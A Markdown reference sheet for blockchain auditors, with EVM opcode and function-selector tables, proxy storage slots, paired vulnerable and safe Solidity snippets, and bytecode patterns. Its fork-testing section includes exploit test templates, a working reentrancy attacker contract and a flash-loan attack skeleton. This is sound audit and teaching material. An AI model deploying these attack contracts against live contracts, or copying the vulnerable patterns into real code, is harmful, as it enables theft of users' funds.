# Blockchain Auditor Reference

## EVM Opcodes Reference

### Dangerous Opcodes

| Opcode | Hex | Gas | Description | Risk Level |
|--------|-----|-----|-------------|------------|
| SELFDESTRUCT | `ff` | 5000+ | Destroys contract, sends ETH to address | Critical |
| DELEGATECALL | `f4` | 700 | Executes code in caller's context | High |
| CALLCODE | `f2` | 700 | Deprecated delegatecall variant | High |
| CALL | `f1` | 700 | External call with ETH transfer | Medium |
| CREATE2 | `f5` | 32000 | Deterministic contract deployment | Medium |
| STATICCALL | `fa` | 700 | Read-only external call | Low |

### Access Control Opcodes

| Opcode | Hex | Returns | Use |
|--------|-----|---------|-----|
| CALLER | `33` | msg.sender | Direct caller address |
| ORIGIN | `32` | tx.origin | Transaction originator |
| ADDRESS | `30` | this | Current contract address |
| BALANCE | `31` | wei | Address balance |

### Storage Opcodes

| Opcode | Hex | Description |
|--------|-----|-------------|
| SLOAD | `54` | Load from storage |
| SSTORE | `55` | Store to storage |
| MLOAD | `51` | Load from memory |
| MSTORE | `52` | Store to memory |

## Common Function Selectors

### Ownership/Admin

| Selector | Signature | Risk |
|----------|-----------|------|
| `0x8da5cb5b` | owner() | Info |
| `0xf2fde38b` | transferOwnership(address) | High |
| `0x715018a6` | renounceOwnership() | High |
| `0x7065cb48` | addOwner(address) | High |
| `0x173825d9` | removeOwner(address) | High |

### Fund Movement

| Selector | Signature | Risk |
|----------|-----------|------|
| `0x3ccfd60b` | withdraw() | Critical |
| `0x2e1a7d4d` | withdraw(uint256) | Critical |
| `0x51cff8d9` | withdraw(address) | Critical |
| `0xe63697c8` | withdrawAll() | Critical |
| `0xcbf0b0c0` | kill(address) | Critical |
| `0x41c0e1b5` | kill() | Critical |
| `0x83197ef0` | destroy() | Critical |

### Token Operations

| Selector | Signature | Risk |
|----------|-----------|------|
| `0xa9059cbb` | transfer(address,uint256) | Medium |
| `0x23b872dd` | transferFrom(address,address,uint256) | Medium |
| `0x095ea7b3` | approve(address,uint256) | Medium |
| `0x70a08231` | balanceOf(address) | Info |

### Proxy Patterns

| Selector | Signature | Use |
|----------|-----------|-----|
| `0x5c60da1b` | implementation() | EIP-1967 |
| `0x3659cfe6` | upgradeTo(address) | UUPS |
| `0x4f1ef286` | upgradeToAndCall(address,bytes) | UUPS |

## Storage Slot Patterns

### EIP-1967 Proxy Slots

```
Implementation: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
Beacon: 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50
Admin: 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
```

### Common Mapping Patterns

```solidity
// mapping(address => uint) balances at slot 0
keccak256(abi.encode(address, 0))

// mapping(address => mapping(address => uint)) allowances at slot 1
keccak256(abi.encode(spender, keccak256(abi.encode(owner, 1))))
```

## Vulnerability Patterns

### Reentrancy

```solidity
// VULNERABLE
function withdraw() external {
    uint amount = balances[msg.sender];
    (bool success,) = msg.sender.call{value: amount}("");  // External call FIRST
    require(success);
    balances[msg.sender] = 0;  // State update AFTER
}

// SAFE
function withdraw() external {
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;  // State update FIRST
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

### Integer Overflow (< 0.8.0)

```solidity
// VULNERABLE (Solidity < 0.8.0)
function transfer(uint256 amount) {
    balances[msg.sender] -= amount;  // Can underflow!
    balances[recipient] += amount;   // Can overflow!
}

// SAFE
function transfer(uint256 amount) {
    require(balances[msg.sender] >= amount, "Insufficient");
    balances[msg.sender] = balances[msg.sender].sub(amount);
    balances[recipient] = balances[recipient].add(amount);
}
```

### tx.origin Authentication

```solidity
// VULNERABLE
function withdraw() {
    require(tx.origin == owner);  // Can be bypassed via malicious contract
    payable(owner).transfer(address(this).balance);
}

// SAFE
function withdraw() {
    require(msg.sender == owner);
    payable(owner).transfer(address(this).balance);
}
```

### Uninitialized Storage Pointer (< 0.5.0)

```solidity
// VULNERABLE
function vulnerable() {
    MyStruct storage s;  // Points to slot 0!
    s.value = 123;       // Overwrites slot 0
}
```

### Delegatecall to Untrusted Contract

```solidity
// VULNERABLE
function execute(address target, bytes calldata data) external {
    target.delegatecall(data);  // Can overwrite storage!
}
```

## Bytecode Analysis Patterns

### Function Dispatcher

```
PUSH1 0xe0
PUSH1 0x02
EXP
PUSH1 0x00
CALLDATALOAD
DIV
PUSH4 <selector>
DUP2
EQ
PUSH2 <offset>
JUMPI
```

### Owner Check Pattern

```
CALLER          ; msg.sender
PUSH20 <owner>  ; Hardcoded owner
EQ
ISZERO
PUSH2 <revert>
JUMPI
```

### Balance Transfer Pattern

```
PUSH1 0x00      ; Return data offset
PUSH1 0x00      ; Return data size
PUSH1 0x00      ; Args offset
PUSH1 0x00      ; Args size
PUSH <value>    ; ETH value
PUSH20 <addr>   ; Recipient
PUSH2 <gas>     ; Gas
CALL
```

## Fork Testing Templates

### Basic Exploit Test

```solidity
contract ExploitTest is Test {
    address constant TARGET = 0x...;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        uint256 targetBefore = TARGET.balance;
        uint256 attackerBefore = attacker.balance;

        vm.prank(attacker);
        // Exploit here

        assertGt(attacker.balance, attackerBefore);
        assertLt(TARGET.balance, targetBefore);
    }
}
```

### Reentrancy Attack

```solidity
contract ReentrancyAttacker {
    address target;
    uint256 count;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        IVulnerable(target).deposit{value: msg.value}();
        IVulnerable(target).withdraw();
    }

    receive() external payable {
        if (count < 5 && target.balance > 0) {
            count++;
            IVulnerable(target).withdraw();
        }
    }
}
```

### Flash Loan Attack Template

```solidity
contract FlashLoanAttacker {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Attack logic with borrowed funds
        // ...

        // Repay flash loan
        for (uint i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(msg.sender, amounts[i] + premiums[i]);
        }
        return true;
    }
}
```

## RPC Methods Reference

### Balance & Code

```bash
# Get ETH balance
cast balance <address> --rpc-url $RPC

# Get bytecode
cast code <address> --rpc-url $RPC

# Get storage slot
cast storage <address> <slot> --rpc-url $RPC
```

### Transaction Simulation

```bash
# Call (read-only)
cast call <address> "function(args)" --rpc-url $RPC

# Estimate gas
cast estimate <address> "function(args)" --rpc-url $RPC

# Send transaction
cast send <address> "function(args)" --rpc-url $RPC --private-key $KEY
```

### Block Information

```bash
# Current block
cast block-number --rpc-url $RPC

# Block timestamp
cast block latest timestamp --rpc-url $RPC
```

## Etherscan API

### Get Source Code

```bash
curl "https://api.etherscan.io/api?module=contract&action=getsourcecode&address=<addr>&apikey=$KEY"
```

### Get ABI

```bash
curl "https://api.etherscan.io/api?module=contract&action=getabi&address=<addr>&apikey=$KEY"
```

### Get Contract Creator

```bash
curl "https://api.etherscan.io/api?module=contract&action=getcontractcreation&contractaddresses=<addr>&apikey=$KEY"
```

## 4byte.directory API

### Lookup Selector

```bash
curl "https://www.4byte.directory/api/v1/signatures/?hex_signature=0x<4bytes>"
```

### Lookup Event Topic

```bash
curl "https://www.4byte.directory/api/v1/event-signatures/?hex_signature=0x<32bytes>"
```
